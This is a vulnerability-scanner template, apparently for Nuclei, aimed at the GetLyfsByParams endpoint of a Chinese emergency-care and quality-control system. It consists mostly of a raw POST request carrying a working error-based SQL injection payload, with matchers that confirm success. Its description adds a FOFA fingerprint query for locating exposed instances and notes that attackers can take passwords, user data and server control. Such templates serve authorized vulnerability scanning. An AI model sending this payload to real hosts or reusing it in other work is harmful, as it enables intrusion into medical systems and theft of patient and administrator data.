http:
    - matchers:
        - part: body
          type: word
          words:
            - qzvvq1qzpzq1
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
          Content-Type: application/x-www-form-urlencoded

          strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x717a767671,(SELECT (ELT(9054=9054,1))),0x717a707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
id: bianque-GetLyfsByParams-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-757866684" || icon_hash="-1206146847"
        扁鹊飞救智能急救与质控系统 GetLyfsByParams 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 扁鹊飞救智能急救与质控系统 GetLyfsByParams SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/SkdtgWlj5htqckfjKUKrmQ
    severity: high
    tags:
        - AppServ
        - appserv
        - 扁鹊飞救智能急救与质控系统
